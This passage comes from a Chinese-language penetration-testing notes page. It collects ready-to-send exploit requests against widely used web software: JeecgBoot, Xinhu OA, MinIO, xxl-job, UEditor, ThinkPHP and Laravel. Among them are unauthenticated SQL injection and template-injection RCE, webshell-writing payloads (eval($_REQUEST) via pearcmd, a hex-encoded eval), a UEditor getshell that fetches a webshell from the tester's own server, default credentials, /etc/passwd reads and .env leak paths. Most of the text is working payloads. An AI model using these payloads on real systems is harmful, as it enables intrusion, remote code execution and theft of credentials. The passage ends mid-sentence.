class="line">/jeecg-boot/sys/user/querySysUser?username=admin</span><br></pre></td></tr></table></figure></li><li><p>未授权sql注入（报错注入）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/qurestSql</span><br><span class="line"></span><br><span class="line">&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27; or &#x27;%1%&#x27; like (updatexml(0x3a,concat(1,(select current_user)),1)) or &#x27;%%&#x27; like &#x27;&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>SSTI注入</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>123</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;<span class="keyword">open</span> -a calculator.app  \&quot;) &#125;&#x27; &quot;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>JDBC</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/testConnection</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.90.1:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-powershell">&#123;</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;code&quot;</span>: <span class="string">&quot;dataSource1&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbType&quot;</span>: <span class="string">&quot;H2&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbDriver&quot;</span>: <span class="string">&quot;org.h2.Driver&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUrl&quot;</span>: <span class="string">&quot;jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS <span class="variable">$</span><span class="variable">$</span>//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)\u000A<span class="variable">$</span><span class="variable">$</span>&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbName&quot;</span>: <span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbUsername&quot;</span>: <span class="string">&quot;sa&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;dbPassword&quot;</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-powershell">  <span class="string">&quot;connectTimes&quot;</span>: <span class="number">5</span></span></span><br><span class="line"><span class="language-powershell">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="信呼OA"><a href="#信呼OA" class="headerlink" title="信呼OA"></a>信呼OA</h3><ul><li><p>后台文件上传</p><p><img src="/../images/image-20230901104539733.png" alt="image-20230901104539733"></p><p><img src="/../images/image-20230901104908007.png" alt="image-20230901104908007"></p><p>还原文件</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=19</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901104840680.png" alt="image-20230901104840680"></p></li><li><p>后台配置文件getshell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=<span class="literal">true</span>&amp;style=<span class="number">21</span>,id=<span class="number">1</span>,name=<span class="number">0x610A6576616C28245F504F53545B315D293B2F2F</span></span><br></pre></td></tr></table></figure><p>重新登陆</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=<span class="literal">true</span>&amp;rnd=<span class="number">705961</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901110753588.png" alt="image-20230901110753588"></p><p>代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php</span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230901104430670.png" alt="image-20230901104430670"></p><p>注意：用了这个后台主页会出现问题</p></li><li><p>后台SSRF</p><p>保存请求</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?a=setsave&amp;m=xinhu&amp;d=main&amp;ajaxbool=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">host</span>=http://<span class="literal">on</span>j888.dnslog.cn</span></span><br></pre></td></tr></table></figure><p>发送请求</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?a=testsends&amp;m=xinhu&amp;d=main&amp;ajaxbool=true</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure></li><li><p>前台存储型XSS漏洞</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?m=login&amp;a=getoption&amp;ajaxbool=true&amp;num=aaaa\</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Client-ip:111&#x27;,web=0x3C7363726970743E616C65727428787373293C2F7363726970743E--</span><br></pre></td></tr></table></figure><blockquote><p>web&#x3D; [XSS代码的hex编码]+[(tab键)–(tab键)]</p></blockquote><p>查看日志处触发xss代码</p></li></ul><h3 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h3><ul><li>进后台</li><li>前台找插件，扫备份文件</li></ul><p><a href="https://mp.weixin.qq.com/s/kJDo2725ztlAO2HCnANOlg">干货 | Wordpress网站渗透方法指南 (qq.com)</a></p><p><a href="https://wpscan.com/">WPScan: WordPress Security Scanner</a></p><p><a href="https://www.jianshu.com/p/42e3b065ad76">WordPress xmlrpc.php 漏洞利用 - 简书 (jianshu.com)</a></p><blockquote><p>我只能收到dnslog</p></blockquote><p>密码重置</p><blockquote><p>哥斯拉的数据库只能执行查询操作</p><p>冰蝎的数据库要自己进行sql操作</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users limit <span class="number">0</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">update</span> wp_users <span class="keyword">set</span> user_pass<span class="operator">=</span>md5(&quot;test&quot;)  <span class="keyword">where</span> user_login<span class="operator">=</span>&quot;oY_Zb5ADu0lV2QM0KarP6y6MrLus&quot;</span><br></pre></td></tr></table></figure><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><ul><li>actuator端点</li><li>swagger接口</li><li>rce</li><li>权限绕过</li></ul><h3 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h3><p>kafara反序列化</p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p><a href="https://fgtbnc.github.io/2023/05/01/Redis%E6%BC%8F%E6%B4%9E/">Redis漏洞 | Khaz’s Blog (fgtbnc.github.io)</a></p><h3 id="VUE"><a href="#VUE" class="headerlink" title="VUE"></a>VUE</h3><p>主要是接口测试</p><ul><li><p>go-vue-admin</p><p><a href="https://www.freebuf.com/articles/network/319175.html">Gin-Vue-admin垂直越权漏洞与代码分析-CVE-2022-21660 - FreeBuf网络安全行业门户</a></p><p><img src="/../images/image-20230828171702219.png" alt="image-20230828171702219"></p><p><img src="/../images/image-20230828171740088.png" alt="image-20230828171740088"></p></li><li><p>vue-typescript-admin</p><p><img src="/../images/image-20230828171358217.png" alt="image-20230828171358217"></p></li></ul><h3 id="FastAdmins"><a href="#FastAdmins" class="headerlink" title="FastAdmins"></a>FastAdmins</h3><p><a href="https://www.loadcaps.com/posts/2bcc03cb.html">Fastadmin 漏洞合集 | Caps</a></p><p><img src="/../images/image-20230913172616785.png" alt="image-20230913172616785"></p><p><img src="/../images/image-20230724153102913.png" alt="image-20230724153102913"></p><p><img src="/../images/image-20230805193921798.png" alt="image-20230805193921798"></p><h3 id="jeeplus"><a href="#jeeplus" class="headerlink" title="jeeplus"></a>jeeplus</h3><p><a href="https://www.freebuf.com/articles/web/220066.html">代码审计入门之Jeeplus代码审计 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jeeplus后台有druid，可以尝试未授权访问</span><br><span class="line">https://xxx/api/jeeplus/druid/index.html</span><br><span class="line">https://xxx/api/jeeplus/swagger-ui.html</span><br></pre></td></tr></table></figure><h3 id="Minio"><a href="#Minio" class="headerlink" title="Minio"></a>Minio</h3><p><strong>默认口令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">minioadmin/minioadmin</span><br></pre></td></tr></table></figure><p><strong>CVE-2023-28432 MinIO信息泄露漏洞</strong> </p><p>未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，最终可能导致攻击者以管理员身份登录MinIO。</p><p>注意点：</p><blockquote><p>在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin&#x2F;minioadmin。</p><p>另外，如果开启动Minio时没有设置MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，那么Minio使用默认账号密码minioadmin，这时候再做信息泄露验证会发现读取不到管理员的账号密码，则推断存在默认口令。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v1/check-version 可以查看MinIO版本</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/minio/bootstrap/v1/verify</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure><p>根据POC改包，可以看到存在信息泄露，包含内网IP泄露等。</p><p><img src="/../images/640" alt="图片"></p><p>拿到账密进入后台之后，可以利用MinIO的自更新达到RCE  <a href="https://mp.weixin.qq.com/s/7-nWwsOLUNs7S83CiH2xMQ">MinIO自更新RCE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html">CVE-2021-21287: 容器与云的碰撞——一次对MinIO的测试 | 离别歌</a></p><h3 id="xxl-job"><a href="#xxl-job" class="headerlink" title="xxl-job"></a>xxl-job</h3><ul><li><p>弱口令+后台命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/123456</span><br></pre></td></tr></table></figure><p>任务管理 - 新增 运行模式使用 GLUE(Shell) </p><p>操作处选择Glue IDE写入命令执行脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/bash</span></span><br><span class="line">cmd</span><br></pre></td></tr></table></figure><p>操作处点击执行即可</p></li><li><p>未授权RCE</p><ul><li><p>XxlJob&lt;&#x3D;2.1.2</p><p><a href="https://xz.aliyun.com/t/11091#toc-3">老曲新唱之XXL-JOB未授权Hessian2反序列化调试分析 - 先知社区 (aliyun.com)</a></p></li><li><p>XxlJob &gt;&#x3D; 2.2.0 </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /run</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;jobId&quot;: 1,</span><br><span class="line">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span><br><span class="line">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span><br><span class="line">  &quot;executorTimeout&quot;: 0,</span><br><span class="line">  &quot;logId&quot;: 1,</span><br><span class="line">  &quot;logDateTime&quot;: 1586629003729,</span><br><span class="line">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span><br><span class="line">  &quot;glueSource&quot;: &quot;命令&quot;,</span><br><span class="line">  &quot;glueUpdatetime&quot;: 1586699003758,</span><br><span class="line">  &quot;broadcastIndex&quot;: 0,</span><br><span class="line">  &quot;broadcastTotal&quot;: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="adminer"><a href="#adminer" class="headerlink" title="adminer"></a>adminer</h3><p><img src="/../images/20220415164052-c209290a-bc97-1.png" alt="20220415164052-c209290a-bc97-1"></p><p><a href="https://xz.aliyun.com/t/11225#toc-6">一次adminer之旅 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.yuque.com/challenger-sfhjb/blog/xv4gts">Adminer(&lt;4.7.9)-SSRF-众测时复现+Ffuf批量脚本 · 语雀 (yuque.com)</a></p><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><h4 id="kindeditor-lt-x3D-4-1-11–XSS"><a href="#kindeditor-lt-x3D-4-1-11–XSS" class="headerlink" title="kindeditor&lt;&#x3D;4.1.11–XSS"></a>kindeditor&lt;&#x3D;4.1.11–XSS</h4><p>上传路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/kindeditor/asp/upload_json.asp?dir=file</span><br><span class="line">/kindeditor/asp.net/upload_json.ashx?dir=file</span><br><span class="line">/kindeditor/jsp/upload_json.jsp?dir=file</span><br><span class="line">/kindeditor/php/upload_json.php?dir=file</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/kindeditor/asp/upload_json.asp?dir=file</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>210</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZ4ILit8qr5XXhdT5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryZ4ILit8qr5XXhdT5</span></span><br><span class="line"><span class="language-routeros">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;imgFile&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;1.html&quot;</span></span></span><br><span class="line"><span class="language-routeros">Content-Type: text/html</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(1)&gt;</span></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryZ4ILit8qr5XXhdT5--</span></span><br></pre></td></tr></table></figure><h4 id="Ueditor"><a href="#Ueditor" class="headerlink" title="Ueditor"></a>Ueditor</h4><ul><li><p>SSRF</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ueditor/jsp/getRemoteImage.jsp?upfile=url</span><br><span class="line">/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=url</span><br><span class="line">/ueditor/php/controller.php?action=catchimage&amp;source[]=url</span><br></pre></td></tr></table></figure></li><li><p>文件上传</p><ul><li><p>XSS</p><blockquote><p>Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/asp/config.json</span><br><span class="line">/ueditor/net/config.json</span><br><span class="line">/ueditor/php/config.json</span><br><span class="line">/ueditor/jsp/config.json</span><br></pre></td></tr></table></figure><p>上传PATH</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ueditor/xxx/controller.php?action=uploadfile</span><br><span class="line">/ueditor/xxx/controller.php?action=uploadimage</span><br></pre></td></tr></table></figure><p>数据包</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">  Content-Length: 325</span><br><span class="line">  </span><br><span class="line">  ------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">  Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.xml&quot;</span><br><span class="line">  Content-Type: image/png</span><br><span class="line">  </span><br><span class="line">  &lt;html&gt;</span><br><span class="line">  &lt;head&gt;&lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt; alert(1);</span><br><span class="line">  &lt;/something:script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br><span class="line">  ------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br></pre></td></tr></table></figure><p>问题</p><p><img src="/../images/image-20230928150035548.png" alt="image-20230928150035548"></p></li><li><p>.net下GetShell</p><blockquote><p>服务器上存放名为666.jpg的图片马</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/替换漏洞URL地址拼接/UEditor/net/controller.ashx?action=catchimage</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>x.x.x.x</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;100&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli">source[]=http:<span class="string">//</span>替换为自己服务器开启http服务的URL地址<span class="string">/666.jpg</span>?<span class="string">.aspx</span></span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="帆软"><a href="#帆软" class="headerlink" title="帆软"></a>帆软</h3><p><a href="https://help.fanruan.com/finereport/doc-view-4833.html">安全漏洞声明- FineReport帮助文档 - 全面的报表使用教程和学习资料</a></p><p>能够作为致远OA的组件</p><ul><li><p>帆软V8</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjY1MDEwNA==&mid=2247483675&idx=1&sn=3a6d8544cf5d4396b21d49ab91bd59bf&chksm=cf2e4a0cf859c31ab0703576966a1c46dd565e29cacd3fba3116ba3684923b80286ea1041e31&scene=126&sessionid=1647656066&subscene=207&key=b58103fa9e1debe406843de4e261019a638ff6adb409cef53de99d6db836986a2d16232425a37f1e3d56c18d1c08821da5713530b2aa9646cfd37bece4f874cf51cf11dcb88ca80a05286826a662b7f6515c8ad6fc7c01517ac5ab3996de95d328bd72fda95f86dbbdbb37765685dc68733dca335ff43cb90e04a003d38c1869&ascene=0&uin=MTM1NzU2MDQ1OQ==&devicetype=Windows+Server+2016+x64&version=6305002e&lang=zh_CN&exportke">帆软报表组合拳漏洞分析</a></p><p>[帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757 - Vuls Wiki](<a href="https://vuls.info/PeiQi/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8">https://vuls.info/PeiQi/wiki/oa/帆软OA/帆软报表</a> V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757&#x2F;#_4)</p><p><a href="https://www.freesion.com/article/1056237571/">FineReport（帆软）报表系统目录遍历漏洞复现和用简易过滤器处理 - 灰信网（软件开发博客聚合）</a></p></li><li><p>帆软V9</p><p><a href="https://xz.aliyun.com/t/9578">帆软（FineReport) V9任意文件覆盖漏洞 - 先知社区</a></p></li><li><p>帆软V10</p><p>反序列化</p></li></ul><p><img src="/../images/image" alt="img"></p><p><img src="/../images/image-20230731170236076.png" alt="image-20230731170236076"></p><h3 id="Blade-X"><a href="#Blade-X" class="headerlink" title="Blade-X"></a>Blade-X</h3><p>图标</p><p><img src="/../images/favicon.png" alt="favicon"></p><p><a href="https://forum.butian.net/share/1089">奇安信攻防社区-spring-blade SQL注入漏洞 (butian.net)</a></p><p><a href="https://juejin.cn/post/7194311491175055418">转载：SpringBlade框架JWT认证缺陷漏洞CVE-2021-44910 - 掘金 (juejin.cn)</a></p><h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><ul><li><p>debug模式下</p><ul><li><p>敏感变量泄漏：比如数据库的账密</p></li><li><p>日志泄漏（这个感觉比较多）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认日志名为year_month_day.log</span></span><br><span class="line">/Application/Runtime/Logs/app_name/日志名</span><br><span class="line">/Runtime/Logs/app_name/日志名</span><br></pre></td></tr></table></figure></li><li><p>找登录日志进后台</p></li><li><p>观察sql语句进行SQL注入</p></li><li><p>cache文件getshell &lt;&#x3D; 5.10</p><blockquote><p>缓存文件：网站为了实现加速访问，会将用户访问过的页面存入缓存来减小数据库查询的开销</p><p>可能需要通过日志找到cache文件的命名方式</p></blockquote><p>默认情况下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 漏洞形成点</span></span><br><span class="line"><span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="variable">$value</span>,<span class="number">3600</span>); <span class="comment"># set(缓存标识，缓存值，缓存保留时间)</span></span><br><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="variable">$data</span> . <span class="string">&quot;\n?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;%0a%0dphpinfo();//&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成的缓存文件位置</span></span><br><span class="line">/runtime/cache/<span class="title function_ invoke__">MD5</span>(name)前两位/<span class="title function_ invoke__">MD5</span>(name)后<span class="number">30</span>位.php</span><br></pre></td></tr></table></figure></li></ul></li><li><p>文件读取</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?s=index/\think\Lang/load&amp;file=/etc/passwd</span><br></pre></td></tr></table></figure></li><li><p>反序列化</p><p>两种形式payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"></span><br><span class="line">POST ?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;s=calc&amp;method=get</span><br><span class="line"></span><br><span class="line">POST ?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</span><br></pre></td></tr></table></figure><p>关键是找好路由，默认是以.&#x2F;public&#x2F;index.php作为入口文件，但是很多都是二开，入口文件不一样</p><p><img src="/../images/image-20230822212120431.png" alt="image-20230822212120431"></p></li><li><p>ThinkPHP&lt;6.0.13，多语言模块写🐎（这个漏洞的知识点在CTF中出现过很多次，因为docker下的PHP环境默认满足以下前提条件）</p><p>前提条件：</p><ol><li>PHP环境开启了<code>register_argc_argv</code></li><li>PHP环境安装了pcel&#x2F;pear</li></ol><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_REQUEST[&#x27;a&#x27;]);?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure><blockquote><p>记得在burp中发送，否则浏览器会将&lt;编码导致无法解析</p></blockquote></li></ul><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><p>index.php</p><p><img src="/../images/image-20230926145212432.png" alt="image-20230926145212432"></p><p>报错信息</p><p><img src="/../images/image-20230926145157351.png" alt="image-20230926145157351"></p><ul><li><p>debug模式下信息泄漏</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">使用不允许的请求方法</span><br><span class="line">或者目录扫描？？？</span><br><span class="line">.env</span><br><span class="line">vendor/.env</span><br><span class="line">lib/.env</span><br><span class="line">lab/.env</span><br><span class="line">cronlab/.env</span><br><span class="line">cron/.env</span><br><span class="line">core/.env</span><br><span class="line">core/app/.env</span><br><span class="line">core/Database/.env</span><br><span class="line">database/.env</span><br><span class="line">config/.env</span><br><span class="line">assets/.env</span><br><span class="line">app/.env</span><br><span class="line">apps/.env</span><br><span class="line">uploads/.env</span><br><span class="line">sitemaps/.env</span><br><span class="line">site/.env</span><br><span class="line">admin/.env</span><br><span class="line">web/.env</span><br><span class="line">public/.env</span><br><span class="line">en/.env</span><br><span class="line">tools/.env</span><br><span class="line">v1/.env</span><br><span class="line">administrator/.env</span><br><span class="line">laravel/.env</span><br></pre></td></tr></table></figure></li><li><p>任意用户登录&lt;8.23</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">content-type:application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:[0,0],&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>NDay</p><p><a href="https://xz.aliyun.com/t/9030">Laravel Debug mode RCE（CVE-2021-3129）分析复现 - 先知社区 (aliyun.com)</a></p></li></ul><h4 id="CVE-2018-15133"><a href="#CVE-2018-15133" class="headerlink" title="CVE-2018-15133"></a>CVE-2018-15133</h4><ul><li>Laravel framework 5.5.x&lt;&#x3D;5.5.40，Laravel framework 